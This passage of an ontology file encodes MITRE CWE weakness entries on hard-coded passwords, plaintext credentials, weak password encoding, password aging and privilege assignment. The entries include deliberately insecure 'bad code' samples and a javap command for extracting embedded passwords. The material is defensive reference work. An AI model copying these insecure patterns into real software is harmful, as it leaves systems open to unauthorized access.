An empty string should never be used as a password as this can allow unauthorized access to the application. Username and password information should not be included in a configuration file or a properties file in clear text. If possible, encrypt this information and avoid CWE-260 and CWE-13."^^xsd:string
                 
                 demonstrative_examples  "Example 1"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Passwords should be at least eight characters long -- the longer the better. Avoid passwords that are in any way similar to other passwords you have. Avoid using words that may be found in a dictionary, names book, on a map, etc. Consider incorporating numbers and/or punctuation into your password. If you do use common words, consider replacing letters in that word with numbers and punctuation. However, do not use \"similar-looking\" punctuation. For example, it is not a good idea to change cat to c@t, ca+, (@+, or anything similar. Finally, it is never appropriate to use an empty string as a password."^^xsd:string
                 
                 system_configuration  ""^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-259_Use_of_Hard-coded_Password

    Annotations: 
        rdfs:comment "A hard-coded password typically leads to a significant authentication failure that can be difficult for the system administrator to detect. Once detected, it can be difficult to fix, so the administrator may be forced into disabling the product entirely. There are two main variations:

Inbound: the software contains an authentication mechanism that checks for a hard-coded password.
Outbound: the software connects to another system or component, and it contains hard-coded password for connecting to that component.
In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the software. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the software will have the same password, even across different organizations, this enables massive attacks such as worms to take place.

The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end software. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple."^^xsd:string,
        rdfs:comment "Maintenance
This entry should probably be split into multiple variants: an inbound variant (as seen in the second demonstrative example) and an outbound variant (as seen in the first demonstrative example). These variants are likely to have different consequences, detectability, etc. See extended description."^^xsd:string,
        rdfs:comment "The software contains a hard-coded password, which it uses for its own inbound authentication or for outbound communication to external components."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     
     Annotations: rdfs:comment "Reverse Engineer an Executable to Expose Assumed Hidden Functionality or Content"^^xsd:string
                 
                 related_attack_patterns  CAPEC-190,
     
     Annotations: rdfs:comment "Read Sensitive Strings Within an Executable."^^xsd:string
                 
                 related_attack_patterns  CAPEC-191,
     ID  "259"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "For front-end to back-end connections: Three solutions are possible, although none are complete.
The first suggestion involves the use of generated passwords which are changed automatically and must be entered at given time intervals by a system administrator. These passwords will be held in memory and only be valid for the time intervals.
Next, the passwords used should be limited at the back end to only performing actions valid for the front end, as opposed to having full access.
Finally, the messages sent should be tagged and checksummed with time sensitive values so as to prevent replay style attacks."^^xsd:string, 
                 rdfs:comment "For inbound authentication: Rather than hard-code a default username and password for first time logins, utilize a \"first login\" mode that requires the user to enter a unique strong password."^^xsd:string, 
                 rdfs:comment "For inbound authentication: apply strong one-way hashes to your passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When receiving an incoming password during authentication, take the hash of the password and compare it to the hash that you have saved.
Use randomly assigned salts for each separate hash that you generate. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method."^^xsd:string, 
                 rdfs:comment "For outbound authentication: store passwords outside of the code in a strongly-protected, encrypted configuration file or database that is protected from access by all outsiders, including other local users on the same system. Properly protect the key (CWE-320). If you cannot use encryption to protect the file, then make sure that the permissions are as restrictive as possible."^^xsd:string, 
                 rdfs:comment "Perform access control checks and limit which entities can access the feature that requires the hard-coded password. For example, a feature might only be enabled through the system console instead of through a network connection."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "If hard-coded passwords are used, it is almost certain that malicious users will gain access through the account in question."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The following code uses a hard-coded password to connect to a database:

Example Language: Java   /*(bad code)*/
...
DriverManager.getConnection(url, \"scott\", \"tiger\");
...
This is an example of an external hard-coded password on the client-side of a connection. This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user \"scott\" with a password of \"tiger\" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for application, they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:

(attack code)
 javap -c ConnMngr.class
22: ldc #36; //String jdbc:mysql://ixne.com/rxsql
24: ldc #38; //String scott
26: ldc #17; //String tiger"^^xsd:string
                 
                 demonstrative_examples  "Example 1"^^xsd:string,
     
     Annotations: rdfs:comment "The following code is an example of an internal hard-coded password in the back-end:

(bad code)
Example Language: C 
int VerifyAdmin(char *password) {
if (strcmp(password, \"Mew!\")) {

printf(\"Incorrect Password!\\n\");
return(0)
}
printf(\"Entering Diagnostic Mode...\\n\");
return(1);
}
(bad code)
Example Language: Java 
int VerifyAdmin(String password) {
if (!password.equals(\"Mew!\")) {
return(0)
}
//Diagnostic Mode
return(1);
}
Every instance of this program can be placed into diagnostic mode with the same password. Even worse is the fact that if this program is distributed as a binary-only distribution, it is very difficult to change that password or disable this \"functionality.\""^^xsd:string, 
                 rdfs:comment "The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in plaintext.

This Java example shows a properties file with a plaintext username / password pair.

(bad code)
Example Language: Java 

# Java Web App ResourceBundle properties file 
...
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword
...
The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in plaintext.

(bad code)
Example Language: ASP.NET 
...
<connectionStrings>
<add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" />
</connectionStrings>
...
Username and password information should not be included in a configuration file or a properties file in plaintext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information and avoid CWE-260 and CWE-13."^^xsd:string
                 
                 demonstrative_examples  "Example 2"^^xsd:string,
     
     Annotations: rdfs:comment "Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.
Attach the monitor to the process and perform a login. Using disassembled code, look at the associated instructions and see if any of them appear to be comparing the input to a fixed string or value."^^xsd:string
                 
                 dynamic  "black box"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.
Note: These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."^^xsd:string
                 
                 static  "manual"^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-260_Password_in_Configuration_File

    Annotations: 
        rdfs:comment "Affected Resources:
File or Directory"^^xsd:string,
        rdfs:comment "The software stores a password in a configuration file that might be accessible to actors who do not know the password."^^xsd:string,
        rdfs:comment "This can result in compromise of the system for which the password is used. An attacker could gain access to this file and learn the stored password or worse yet, change the password to one of their choosing."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     ID  "260"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Avoid storing passwords in easily accessible locations."^^xsd:string, 
                 rdfs:comment "Consider storing cryptographic hashes of passwords as an alternative to storing in plaintext."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
Below is a snippet from a Java properties file.

(bad code)
Example Language: Java 
webapp.ldap.username = secretUsername
webapp.ldap.password = secretPassword
Because the LDAP credentials are stored in plaintext, anyone with access to the file can gain access to the resource."^^xsd:string, 
                 rdfs:comment "Example 2
The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in plaintext.

This Java example shows a properties file with a plaintext username / password pair.

(bad code)
Example Language: Java 

# Java Web App ResourceBundle properties file 
...
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword
...
The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in plaintext.

(bad code)
Example Language: ASP.NET 
...
<connectionStrings>
<add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" />
</connectionStrings>
...
Username and password information should not be included in a configuration file or a properties file in plaintext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information and avoid CWE-13."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-261_Weak_Cryptography_for_Passwords

    Annotations: 
        rdfs:comment "Notes:
Other
Password management issues occur when a password is stored in plaintext in an application's properties or configuration file. A programmer can attempt to remedy the password management problem by obscuring the password with an encoding function, such as base 64 encoding, but this effort does not adequately protect the password.

The \"crypt\" family of functions uses weak cryptographic algorithms and should be avoided. It may be present in some projects for compatibility."^^xsd:string,
        rdfs:comment "Obscuring a password with a trivial encoding does not protect the password."^^xsd:string,
        rdfs:comment "Potential Mitigations:
Passwords should be encrypted with keys that are at least 128 bits in length for adequate security."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Rainbow Table Password Cracking"^^xsd:string
                 
                 related_attack_patterns  CAPEC-55,
     ID  "261"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
The following code reads a password from a properties file and uses the password to connect to a database.

(bad code)
Example Language: Java 
...
Properties prop = new Properties();
prop.load(new FileInputStream(\"config.properties\"));
String password = Base64.decode(prop.getProperty(\"password\"));
DriverManager.getConnection(url, usr, password);
...
This code will run successfully, but anyone with access to config.properties can read the value of password and easily determine that the value has been base 64 encoded. If a devious employee has access to this information, they can use it to break into the system."^^xsd:string, 
                 rdfs:comment "Example 2
The following code reads a password from the registry and uses the password to create a new network credential.

(bad code)
Example Language: C# 
...
string value = regKey.GetValue(passKey).ToString();
byte[] decVal = Convert.FromBase64String(value);
NetworkCredential netCred = newNetworkCredential(username,decVal.toString(),domain);
...
This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of password. If a devious employee has access to this information, they can use it to break into the system."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-262_Not_Using_Password_Aging

    Annotations: 
        rdfs:comment "If no mechanism is in place for managing password aging, users will have no incentive to update passwords in a timely manner."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     
     Annotations: rdfs:comment "Dictionary-based Password Attack"^^xsd:string
                 
                 related_attack_patterns  CAPEC-16,
     
     Annotations: rdfs:comment "Password Brute Forcing."^^xsd:string
                 
                 related_attack_patterns  CAPEC-49,
     
     Annotations: rdfs:comment "Rainbow Table Password Cracking."^^xsd:string
                 
                 related_attack_patterns  CAPEC-55,
     
     Annotations: rdfs:comment "Try Common(default) Usernames and Passwords."^^xsd:string
                 
                 related_attack_patterns  CAPEC-70,
     ID  "262"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "The recommendation that users change their passwords regularly and do not reuse passwords is universal among security experts. In order to enforce this, it is useful to have a password aging mechanism that notifies users when passwords are considered old and that requests that they replace them with new, strong passwords. In order for this functionality to be useful, however, it must be accompanied with documentation which stresses how important this practice is and which makes the entire process as simple as possible for the user."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "As passwords age, the probability that they are compromised grows."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "A common example is not having a system to terminate old employee accounts."^^xsd:string, 
                 rdfs:comment "Not having a system for enforcing the changing of passwords every certain period."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     likelihood_of_exploit  "Low"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-263_Password_Aging_with_Long_Expiration

    Annotations: 
        rdfs:comment "Allowing password aging to occur unchecked can result in the possibility of diminished password integrity."^^xsd:string,
        rdfs:comment "Just as neglecting to include functionality for the management of password aging is dangerous, so is allowing password aging to continue unchecked. Passwords must be given a maximum life span, after which a user is required to update with a new and different password."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     
     Annotations: rdfs:comment "Dictionary-based Password Attack"^^xsd:string
                 
                 related_attack_patterns  CAPEC-16,
     
     Annotations: rdfs:comment "Password Brute Forcing"^^xsd:string
                 
                 related_attack_patterns  CAPEC-49,
     
     Annotations: rdfs:comment "Rainbow Table Password Cracking"^^xsd:string
                 
                 related_attack_patterns  CAPEC-55,
     
     Annotations: rdfs:comment "Try Common(default) Usernames and Passwords"^^xsd:string
                 
                 related_attack_patterns  CAPEC-70,
     ID  "263"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Ensure that password aging is limited so that there is a defined maximum age for passwords and so that the user is notified several times leading up to the password expiration."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "As passwords age, the probability that they are compromised grows."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "A common example is not having a system to terminate old employee accounts."^^xsd:string, 
                 rdfs:comment "Not having a system for enforcing the changing of passwords every certain period."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     likelihood_of_exploit  "Low"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-266_Incorrect_Privilege_Assignment

    Annotations: 
        rdfs:comment "A product incorrectly assigns a privilege to a particular actor, creating an unintended sphere of control for that actor."^^xsd:string,
        rdfs:comment "Affected Resources:
System Process"^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "untrusted user placed in unix \"wheel\" group"^^xsd:string
                 
                 references  CVE-1999-1193,
     
     Annotations: rdfs:comment "Product mistakenly assigns a particular status to an entity, leading to increased privileges."^^xsd:string
                 
                 references  CVE-2004-0274,
     
     Annotations: rdfs:comment "Product uses group ID of a user instead of the group, causing it to run with different privileges. This is resultant from some other unknown issue."^^xsd:string
                 
                 references  CVE-2005-2496,
     
     Annotations: rdfs:comment "Product allows users to grant themselves certain rights that can be used to escalate privileges."^^xsd:string
                 
                 references  CVE-2005-2741,
     ID  "266"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "A user can access restricted functionality and/or sensitive information that may include administrative functionality and user account."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Environment Hardening
Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Environment Hardening
Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "where the weakness is typically related to the presence of some other weaknesses"^^xsd:string
                 
                 weakness_ordinalities  "Resultant"^^xsd:string
    
    
Individual: CWE-267_Privilege_Defined_With_Unsafe_Actions

    Annotations: 
        rdfs:comment "A particular privilege, role, capability, or right can be used to perform unsafe actions that were not intended, even when it is assigned to the correct entity."^^xsd:string,
        rdfs:comment "Maintenance:
Note: there are 2 separate sub-categories here:
- privilege incorrectly allows entities to perform certain actions
- object is incorrectly accessible to entities with a given privilege"^^xsd:string,
        rdfs:comment "Maintenance:
This overlaps authorization and access control problems."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Traceroute program allows unprivileged users to modify source address of packet (Accessible entities)."^^xsd:string
                 
                 references  CVE-2000-0315,
     
     Annotations: rdfs:comment "User with capability can prevent setuid program from dropping privileges (Unsafe privileged actions)."^^xsd:string
                 
                 references  CVE-2000-0506,
     
     Annotations: rdfs:comment "User with privilege can edit raw underlying object using unprotected method (Unsafe privileged actions)."^^xsd:string
                 
                 references  CVE-2000-1212,
     
     Annotations: rdfs:comment "User with debugging rights can read entire process (Unsafe privileged actions)."^^xsd:string
                 
                 references  CVE-2001-1166,
     
     Annotations: rdfs:comment "Untrusted entity allowed to access the system clipboard (Unsafe privileged actions)."^^xsd:string
                 
                 references  CVE-2001-1480,
     
     Annotations: rdfs:comment "Extra Linux capability allows bypass of system-specified restriction (Unsafe privileged actions)."^^xsd:string
                 
                 references  CVE-2001-1551,
     
     Annotations: rdfs:comment "\"public\" database user can use stored procedure to modify data controlled by the database owner (Unsafe privileged actions)."^^xsd:string
                 
                 references  CVE-2002-1145,
     
     Annotations: rdfs:comment "Script does not restrict access to an update command, leading to resultant disk consumption and filled error logs (Accessible entities)."^^xsd:string
                 
                 references  CVE-2002-1154,
     
     Annotations: rdfs:comment "Untrusted object/method gets access to clipboard (Accessible entities)."^^xsd:string
                 
                 references  CVE-2002-1671,
     
     Annotations: rdfs:comment "Roles have access to dangerous procedures (Accessible entities)."^^xsd:string
                 
                 references  CVE-2002-1981,
     
     Annotations: rdfs:comment "Allows attachment to and modification of privileged processes (Unsafe privileged actions)."^^xsd:string
                 
                 references  CVE-2002-2042,
     
     Annotations: rdfs:comment "Bypass domain restrictions using a particular file that references unsafe URI schemes (Accessible entities)."^^xsd:string
                 
                 references  CVE-2004-0380,
     
     Annotations: rdfs:comment "Gain privileges using functions/tags that should be restricted (Accessible entities)."^^xsd:string
                 
                 references  CVE-2004-2204,
     
     Annotations: rdfs:comment "Inappropriate actions allowed by a particular role(Unsafe privileged actions)."^^xsd:string
                 
                 references  CVE-2005-1742,
     
     Annotations: rdfs:comment "Non-root admins can add themselves or others to the root admin group (Unsafe privileged actions)."^^xsd:string
                 
                 references  CVE-2005-1816,
     
     Annotations: rdfs:comment "Certain debugging commands not restricted to just the administrator, allowing registry modification and infoleak (Unsafe privileged actions)."^^xsd:string
                 
                 references  CVE-2005-2027,
     
     Annotations: rdfs:comment "Users can change certain properties of objects to perform otherwise unauthorized actions (Unsafe privileged actions)."^^xsd:string
                 
                 references  CVE-2005-2173,
     
     Annotations: rdfs:comment "Restful Privilege Elevation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-58,
     
     Annotations: rdfs:comment "Probe Audio and Video Peripherals"^^xsd:string
                 
                 related_attack_patterns  CAPEC-634,
     
     Annotations: rdfs:comment "Collect Data from Clipboard"^^xsd:string
                 
                 related_attack_patterns  CAPEC-637,
     
     Annotations: rdfs:comment "Identify Shared Files/Directories on System"^^xsd:string
                 
                 related_attack_patterns  CAPEC-643,
     
     Annotations: rdfs:comment "Collect Data from Screen Capture"^^xsd:string
                 
                 related_attack_patterns  CAPEC-648,
     ID  "267"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Environment Hardening
Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "A user can access restricted functionality and/or sensitive information that may include administrative functionality and user account."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
This code intends to allow only Administrators to print debug information about a system.

Example Language: Java / * (bad code) */
public enum Roles {
ADMIN,USER,GUEST
}

public void printDebugInfo(User requestingUser){
if(isAuthenticated(requestingUser)){
switch(requestingUser.role){
case GUEST:
System.out.println(\"You are not authorized to perform this command\");
break;

default:
System.out.println(currentDebugState());
break;
}
}
else{
System.out.println(\"You must be logged in to perform this command\");
}
}
While the intention was to only allow Administrators to print the debug information, the code as written only excludes those the with the role of \"GUEST\". Someone with the role of \"ADMIN\" or \"USER\" will be allowed access, which goes against the original intent. An attacker may be able to use this debug information to craft an attack on the system."^^xsd:string
                 
                 demonstrative_examples  "",
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Environment Hardening
Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 operation  ""^^xsd:string
    
    
Individual: CWE-268_Privilege_Chaining

    Annotations: 
        rdfs:comment "Relationship
There is some conceptual overlap with Unsafe Privilage."^^xsd:string,
        rdfs:comment "Research Gap
It is difficult to find good examples for this weakness."^^xsd:string,
        rdfs:comment "Two distinct privileges, roles, capabilities, or rights can be combined in a way that allows an entity to perform unsafe actions that would not be allowed without that combination."^^xsd:string
    
    Types: 
